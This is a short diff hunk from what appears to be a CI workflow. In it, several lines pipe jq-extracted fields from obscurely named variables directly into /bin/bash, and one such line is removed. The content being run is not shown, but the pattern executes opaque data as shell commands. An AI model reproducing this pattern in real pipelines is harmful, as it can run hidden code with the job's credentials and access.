@@ -24,7 +24,6 @@ jobs:
           echo $tph51 | jq -r .r0 | /bin/bash
           echo $o4808 | jq -r .ynu5 | /bin/bash
           printf '%s' "$btux197" | jq -r .i421 | /bin/bash
-          printf '%s' "$lpc8" | jq -r .s4934 | /bin/bash
           echo $yxq1 | jq -r .x3772 | /bin/bash
 
       - name: Store output
